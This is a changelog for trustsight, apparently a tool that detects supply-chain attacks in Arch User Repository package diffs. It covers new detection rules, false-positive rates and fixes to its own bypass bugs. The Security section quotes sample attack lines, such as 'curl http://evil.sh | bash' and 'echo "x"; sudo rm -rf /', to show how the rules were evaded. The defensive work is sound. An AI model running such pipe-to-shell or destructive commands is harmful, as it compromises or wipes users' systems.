# Changelog

## [0.6.0] - 2026-07-25

### Added

- **Four more supply-chain rules**, all off by default, each measured against the 3246-diff benign corpus before being designed. **D004 0.00 %, R062 0.09 %, R063 0.00 %, R064 0.03 %.**
    - **D004 (HIGH)** `provides`/`replaces` claims an established package unrelated to this one, installing it in front of the real thing. Variants (`htop-vim` → `htop`) and siblings (`linux-cachyos` → `linux-headers`) are suppressed, but a shared *ecosystem* prefix is not: `python-evil` claiming `python-requests` still fires, because thousands of unrelated packages share `python-`. "Established" is `pacman -Slq`, falling back to `observation_count`.
    - **R062 (HIGH)** a `.install` hook that fetches or performs a privileged operation. Hooks run as root at install time. Needed no new parsing: `generate_diff()` already includes `*.install` patches and `_classify_enclosing_function()` recognises `post_install()` like any other function.
    - **R063 (HIGH)** a patch applied from a URL, an absolute path, or process substitution.
    - **R064 (MEDIUM)** a `source=` URL downgraded from `https` to `http`. `extract_source_array_urls()` gained a `side` parameter so both sides of the diff can be compared.
- **D-series dependency-graph rules**, closing part of the documented build-dependency blind spot. All are **off by default** under a new `[experimental_rules]` config section, so `baseline.json` is unaffected until they are deliberately enabled.
    - **D001 (HIGH)** novel dependency: a name never observed anywhere in the AUR. Backed by a new `dependency_names` table seeded from every dependency entry **plus every package name and `provides` alias**, without which a real package that nothing else depends on would read as novel. Silent on an unseeded database rather than flagging everything.
    - **D002 (HIGH)** typosquatted dependency, e.g. `openss1` for `openssl`. Refines D001 and is reported in its place.
    - **D003 (MEDIUM)** `makedepends` gains a network-capable tool, so the build can fetch code no checksum covers.
- **R060 is now INFO (weight 0) and on by default.** It fires on 21.4 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality: restricting to an unchanged `pkgver` still leaves 11.6 %, and the "version bump that also edits `build()`" case it was proposed for is 9.8 %. At weight 0 it reports context to a reviewer without touching any score.
- **R061 (HIGH)** a download inside a build function whose URL is absent from `source=()`. Off by default.
- `scripts/generate_seed.py` records dependency names from the `.SRCINFO` it already reads, so seeding costs no extra I/O. `normalize_dependency` is shared with the runtime lookup: were the two to normalise differently, every query would miss and every dependency would look novel.
- `tokenizer.resolve_added_lines()` returns resolved lines with positions intact, so a rule can still resolve variables *and* know its enclosing function. Resolution alone discards that.
- The bundled seed is regenerated and now carries **209,909 dependency names** alongside 179,956 URLs and 35,903 maintainers. `seed.db.gz` grows from 13.0 MB to 19.9 MB.

  Fire rates against the 3246-diff benign corpus, so these are false-positive rates: **D001 0.15 %, D002 0.00 %, D003 0.46 %, D004 0.00 %, R061 0.22 %, R062 0.09 %, R063 0.00 %, R064 0.03 %, R060 21.4 %**. R060 is the outlier by design, marking any edit to a build function; at weight 5 it cannot reclassify a package alone but it moves benign p95 more than the other four together, so it deserves a separate decision from the rest.

### Fixed

- **`_EXPERIMENTAL_DEFAULTS` in `analysis.py`.** `load_config()` reads the user's `config.toml` verbatim and never merges new defaults in, so an existing install would never have seen `[experimental_rules]` and R060 would have been dead for every upgrade. Defaults now live in code, with the config file overriding them.
- **D004 did nothing when enabled on its own.** It shared a guard clause that only tested D001-D003, so the whole dependency block returned early unless one of those was also on. Covered by a test that enables each rule in isolation.
- **The dependency extractor read shell code as dependency names.** An unbounded fallback for unquoted array entries pulled `if`, `[[`, and `!` out of a `package()` body, and comments inside dependency arrays contributed every word of the note (`required`, `because`, `disabled`). Together these put D001 at 5.95 % against a true rate of 0.15 %. Array termination is now quote-aware and bounded, tokens are validated against the Arch package-name grammar, and comments are stripped.
- **`resolve_added_lines()` shifted every line after an assignment.** It zipped its output against `tokenize_and_resolve()`, which omits assignment lines, so any added assignment made the two sequences different lengths. An array header could vanish and a rule scoped to `build()` could be handed the wrong function. Substitution is now applied per line from a shared variable table, which `tokenize_and_resolve()` also uses so the two cannot diverge.
- **The release workflow could not commit its result.** The `Commit to the default branch` step failed with `fatal: not in a git directory`, despite `actions/checkout` having run `git init` in the workspace normally. Rather than fight the container's git, the workflow is now split: `makepkg` work (checksum, `--verifysource`, `--printsrcinfo`) runs in the Arch container and hands `PKGBUILD` and `.SRCINFO` over as an artifact, and a second job on the standard runner does the commit. `include-hidden-files` is set on the upload, since `.SRCINFO` is a dotfile and would otherwise be silently dropped. A `concurrency` group stops two releases racing on the same branch.
- **`packaging/aur/PKGBUILD` carried the wrong checksum.** Because the release workflow never completed, `pkgver` had been bumped to 0.5.1 while `sha256sums` still held the v0.5.0 tarball's hash, so `makepkg -si` failed validation for anyone following the documented install. Corrected to the real v0.5.1 hash and verified with `makepkg --verifysource`; `.SRCINFO` regenerated to match.

## [0.5.1] - 2026-07-25

### Added

- `.github/workflows/release-pkgbuild.yml`: on a `v*` tag, downloads the generated source tarball, computes its sha256, and writes `pkgver`, `pkgrel`, and `sha256sums` into `packaging/aur/PKGBUILD` on the default branch, regenerating `.SRCINFO` with `makepkg --printsrcinfo`. The PKGBUILD shipped to users therefore never carries `SKIP`. The checksum is validated with `makepkg --verifysource` before the commit, so a wrong hash fails the release rather than reaching a user.

  The update lands on the default branch and the tag is never moved. GitHub generates the tarball from the tree the tag points at, so amending the tag would change the tarball and invalidate the checksum just computed.

### Fixed

- `packaging/aur/.SRCINFO` was stale: it declared `pkgver = 0.3.0`, an all-zero `sha256sums`, and omitted the `python-typer` dependency the PKGBUILD requires. Regenerated, and now kept current automatically by the release workflow.

## [0.5.0] - 2026-07-25

### Added

- `scripts/build_corpus.py --from-manifest`: rebuilds the exact corpus recorded in `corpus.lock` instead of re-selecting packages by AUR popularity. Fetches only the branches named in the lock into an empty bare repo, so reconstruction takes minutes rather than requiring a full clone of the AUR monorepo. This is what lets CI materialise the corpus, which is gitignored and therefore never present on a fresh checkout.

### Security

- **A message prefix disabled every scoped rule.** Any line starting with `echo`/`printf`/`msg`/ followed by a quote was classified as an inert "message" in its entirety, but a shell line does not end at its first command. `echo "x"; sudo rm -rf /` scored 0 where `sudo rm -rf /` scored 40, so a seven-character prefix switched off R009 (CRITICAL), R010, and R011. Message context now requires the line to contain no command separator (`;`, `&`, `|`) or substitution (`$(`, backtick).
- **Line continuations bypassed the CRITICAL pipe-to-shell rules.** Rules match one line at a time, so splitting `curl http://evil.sh | bash` across a trailing backslash left R001/R002 with only a `curl \` fragment, dropping the score from 65 to 25. Continuations are now joined into one logical line before matching, for both the raw and resolved paths.
- **Variable resolution never ran inside function bodies.** The tokenizer's assignment pattern was anchored at `^(\w+)=`, so any indented assignment (that is, every assignment inside a function) was skipped and the variable table stayed empty. `C=curl` followed by `$C http://evil.sh | bash` resolved to nothing and defeated every rule matching resolved strings, scoring 20 against a baseline of 65. Assignments are now recognised when indented and when introduced by `local`/`export`/`declare`/`readonly`/`typeset`.
- **One-line function bodies escaped function scoping.** `package() { curl evil | bash; }` was classified before the depth counter advanced, so the line read as `other` and `function_body`-scoped rules skipped it; the counter was also left raised for everything that followed.
- **`..` passed package-name validation and could delete the cache root.** `_VALID_PKG_NAME` accepted `.` and `..`, so `repo_path("..")` resolved to the parent of the repo cache, which `clone_or_fetch` then passed to `shutil.rmtree` when it failed to open as a repository. Both names are now rejected, and `repo_path` additionally asserts the resolved path is directly inside the cache root.
- `discovery.fetch_package_info` interpolated the package name straight into the RPC query string; an unescaped `&` or `#` could inject or truncate parameters. It now uses `urlencode`, matching `get_aur_latest_versions`.

### Fixed

- **Mirror Integrity Check never ran.** The `Alert on failure` step's script block was mis-indented, making `mirror-check.yml` unparseable; every run failed during workflow startup. The workflow now also reconstructs the corpus before verifying it, rather than assuming a directory that cannot exist in CI.
- **Corpus Drift Detection failed with `Corpus not found`** for the same reason, and now rebuilds the corpus from the lock first (caching the fetched AUR objects).
- **Corpus diffs were not reproducible across machines.** `git` scales the abbreviation length in `index <old>..<new>` lines to a repository's object count, so a sparse clone emitted 7-character hashes where the full mirror emitted 12: byte-different diffs for identical commits, invalidating `corpus_content_sha256`. `core.abbrev` is now pinned to 12 and recorded in the lock.
- **Overlapping strata double-counted diffs.** A package matching two strata (`python-foo-git` matches both `lang_ecosystem` and `vcs_git`) was walked once per stratum, and both entries were kept, inflating per-stratum fire rates. Entries are now deduplicated at lock-write time, keeping the last stratum to match the overwrite order the corpus on disk already had. `corpus.lock` drops from 3332 to 3246 entries with no change to the corpus itself.
- `corpus.lock` recorded `strata_file` as an absolute path from the generating machine.
- Drift reports are no longer passed through a `GITHUB_OUTPUT` heredoc, whose delimiter could be forged by diff content and whose payload could exceed the 1 MB output limit. Both workflows also suppress duplicate issues instead of filing one per run.

### Documentation

- `re-baselining.md` described behaviour `rebaseline.py` does not have: it does not check out the corpus, does not validate CI gates, and reports no `p5`/`p50`. Strata are package shapes, not `benign`/`malicious`/`synthetic`. Corrected, and the required corpus-reconstruction step added.
- `writing-a-rule.md` referenced a `--check-fire-rate` flag that does not exist, and the wrong corpus path.
- Installation is now documented as a single path: `git clone` from GitHub plus `makepkg -si` against the in-repo PKGBUILD. The pipx and `pip` routes have been removed, and the docs note that the package is not yet published to the AUR.
- `rules.md` documented a bare function header as the only header behaviour, and did not mention that continuations are joined before matching. Both corrected, along with the qualification that `message` context requires the line to be only a message.
- `cli.md` listed `scope-contradiction` as an error; it is now a warning.

## [0.4.1] - 2026-07-25

### Added

- `--json` flag on all commands for machine-readable output.
- PKGBUILD build+install CI workflow using `archlinux:latest` container.
- AUR install instructions in README and getting-started guide.

### Changed

- CLI migrated from `argparse` to `typer`: auto-generated `--help`, type-annotated callbacks, `--json` flag per command. Entry point renamed from `main` to `app`.
- CLI tests updated from `patch(sys.argv)` pattern to `typer.testing.CliRunner`.
- Documentation tests parse typer patterns (`add_typer`, `@command`) instead of argparse `add_parser`.

### Fixed

- Mirror-check CI now triggers on `push` for corpus.lock and benign-corpus changes.

## [0.4.0] - 2026-07-25

### Added

- Multi-repo and foreign package discovery: new `--repo`, `--foreign`, `--all-repos` flags for `trustsight review`. Packages can be scanned from specific local repositories, all auto-detected local repos (excluding official ones), and/or foreign packages. Config-driven defaults via new `[discovery]` section in `config.toml`.
- `vercmp`-based version comparison for accurate detection of outdated packages (replaces string inequality).
- Graceful fallback to string comparison when `vercmp` binary is missing.

### Changed

- Python requirement lowered from `>=3.12` to `>=3.10`. `tomllib` usage replaced with a `tomli` fallback shim for 3.10 compatibility.
- CI matrix expanded to test Python 3.10 through 3.14.
- Catastrophic backtracking detection threshold raised (`_BACKTRACK_REPS` 18 -> 22) to remain effective on Python 3.12+ optimized regex engine.

## [0.3.1] - 2026-07-24

### Fixed

- Verdict text no longer printed to stdout during `review` for every package (stray `print(result)` in `generate_verdict_stream` non-streaming path)
- Stale `~/.pyenv/shims/trustsight` shadowed pipx install, causing `trustsight -v` to report 0.1.0 instead of the actual installed version

### Added

- `-v` / `--version` CLI flags via `importlib.metadata.version()`
- Graceful `KeyboardInterrupt` handling: clean `Interrupted.` message and exit code 130 instead of an SSL/httpx traceback

### Changed

- `-h` help now includes config subcommands section (`config show`, `config set`, `config sync-rules`) and usage examples

## [0.2.2] - 2026-07-24

This release fixes a critical false positive in R013 that could score benign
packages 100/100, restores the novelty engine (Tier C) which had been inert
since v0.1, and ships a pre-seeded database of 178,491 AUR source URLs to
eliminate cold-start INCONCLUSIVE verdicts.

**Existing users must run `trustsight config sync-rules --update`** to receive
the corrected detection patterns. `rules.toml` is written only when absent, so
a package upgrade alone does not update it. The command is additive and never
overwrites a rule you have edited.

Note: `v0.2.1` was already tagged at the previous commit, and the `[0.3.0]`
section below is recorded in this changelog but was never tagged. This release
takes the next free patch number; the 0.3.0 discrepancy is left for a separate
reconciliation.

### Fixed

- R013 (FATAL) fired on legitimate localized text. U+200B-U+200D are mandatory joiners in Malayalam, Lao and other scripts, so a `GenericName[ml]=` line in a browser package scored 100/100; measured on two packages in the benign corpus. Zero-width characters now require ASCII neighbours; bidi overrides, invisible operators and tag characters still fire unconditionally. The pattern also gains U+200E/U+200F, U+2060-U+2064 and the tag block, which `unicode.py` already listed and which account for the documented recall gap.
- R058 fired on `"${pkgdir}"/usr/lib/...`, where the quote closes before the path, and on absolute paths quoted inside `echo` strings. It now requires the command to be the first token on the line and the path to start an argument.
- The maintainer was read from `.SRCINFO`, which does not carry one; checked against the AUR mirror, 0 of 200 `.SRCINFO` files have a `maintainer =` line, while every PKGBUILD opens with `# Maintainer:`. `get_maintainer_from_commit()` therefore always returned `None`, silently disabling `maintainer_changed`, the highest novelty weight (20), and C006. Now read from the PKGBUILD comment, with `.SRCINFO` as a fallback.
- `scan_diff` tracked novelty differently from the live path in three ways: it compared raw URLs instead of `normalize_url`-d ones (so every version bump read as novel), it derived "first seen globally" from the per-package set (making it identical to per-package), and it overwrote rather than OR-ed the flags across multiple URLs (so a familiar URL masked a novel one).
- Tier C novelty was inert: `observation_count` was never populated outside tests, so `maturity()` always read 0 and every novelty weight scored zero. Now sourced from `count_observations()`.
- Homograph detection missed Cyrillic confusables. `has_homograph()` only matched codepoints named `LATIN*`, while the `CONFUSABLES` table it sits beside is Cyrillic; so `github.cоm` classified as `unknown` (+20) rather than `homograph_attack` (+30). Replaced with mixed-script-per-label detection, plus punycode decoding to close the `xn--` bypass. Legitimate single-script IDNs (`.рф`, Japanese, Korean) are not flagged.
- `cli.py` called `set_config` without importing it, so `trustsight config set` raised `NameError`.
- `scripts/build_corpus.py` had a 600s timeout on the AUR bare clone, which the repository cannot meet, so the script could never complete on a fresh machine. Partial clones were also left on disk and reused silently, since `rev-parse --git-dir` succeeds on an interrupted clone.

### Added

- Novelty seed database. `scripts/generate_seed.py` builds it from the AUR git mirror by parsing `.SRCINFO` (including the arch-suffixed `source_x86_64` arrays); `trustsight seed-db` imports it. Without a seed, a fresh install has an empty `source_urls` table, so `url_first_globally` fires for github.com and every other ordinary host, and `maturity()` returns 0 because there is no analysis history; leaving every Medium verdict downgraded to INCONCLUSIVE. Import is additive and idempotent, and never overwrites a row learned from a real analysis.
- `metadata` and `maintainer_counts` tables, and `effective_observation_count()`: maturity falls back to a seed-supplied bootstrap count, and real analyses take over as soon as they outnumber it, so the tool never depends on external data permanently.
- `trustsight lint-rules` (`--file` for CI): detects unreachable, over-broad, and malformed rules. Errors on empty patterns, duplicate ids, ids owned by `analysis.py`, comment-shadowed rules, and scope contradictions; warns on rules that fire on ordinary packaging.
- Expanded ruleset R039-R059 (21 rules), calibrated against a 3322-diff stratified benign corpus and enabled by default. Fourteen fire on zero benign diffs; every remaining hit was inspected individually and all but one were true positives. R053 was split by target: setuid inside `$pkgdir` is MEDIUM (Chromium's sandbox helper legitimately needs 4755, and at MEDIUM this changes no package's risk band), while setuid on an absolute path is a separate HIGH rule, R059. The `experimental` flag remains supported for future additions.
- Programmatic rules C004 (checksum removed for unchanged source), C005 (binary artifact from untrusted source), C006 (maintainer change with new source domain), C007 (command substitution in source array).
- Rule scopes may name a PKGBUILD function (`scope = ["pkgver"]`), not just a line context.
- `added_only` rule field: match only added lines, so deleting a suspicious line no longer raises a package's score.
- Ephemeral paste and file-drop services added to the `raw_hosting` bucket.

### Changed

- Novelty weights recalibrated now that tier C is live: `url_first_globally` 15 → 10, `url_first_in_package` 10 → 5, `maintainer_first_in_package` 20 → 15. The previous values had never been exercised, because `observation_count` was never populated and the maturity multiplier was permanently 0. At full maturity they took a borderline 15-point package with a novel URL and a novel maintainer to 60 (High); the new values keep that case at 45 (Medium). Maintainer novelty remains the strongest signal.
- `_structural_findings()` is now shared by `analyze_package()` and `scan_diff()`, removing ~110 lines duplicated between the live and offline pipelines.

## [0.3.0] - 2026-07-18

- Score column renamed to "Risk Score"
- Rich progress output during review
- AUR RPC batching for performance
- Handle empty AUR repos gracefully
- FATAL severity with hard stop at 100
- Verification evidence detection and scoring
- Source pinning classification
- Code rules C001-C003 for structural anomalies
- URL normalization for novelty dedup
- Maturity-based novelty gating with Inconclusive risk level
- Scope-based rule matching (function_body context)
- R012 (prompt injection) and R013 (unicode bidi) rules
- LLM verdict integrity assertions
- scan_diff offline pipeline for benchmark use
- is_skip_justified analysis for SKIP checksums
- Fix: SKIP checksums no longer count as verification evidence
- Removed R004/R005 from TOML rules (now programmatic, context-aware)
- Default LLM provider changed to openai
- CI workflows for corpus drift monitoring
- 267 tests (was 218)

## [0.2.0] - 2026-07-15

- R004/R005 rule hardening with quote bypass fix
- Tokenizer iteration fix
- Forge classification cap
- IDN detection
- Shell variant coverage
- base64 --decode detection

## [0.1.0] - 2026-07-12

- Initial release
- R001-R011 rules
- AUR diff analysis pipeline
- Deterministic scoring
- SQLite novelty tracking
- LLM verdict integration
- Basic CLI (review, inspect, history, config)
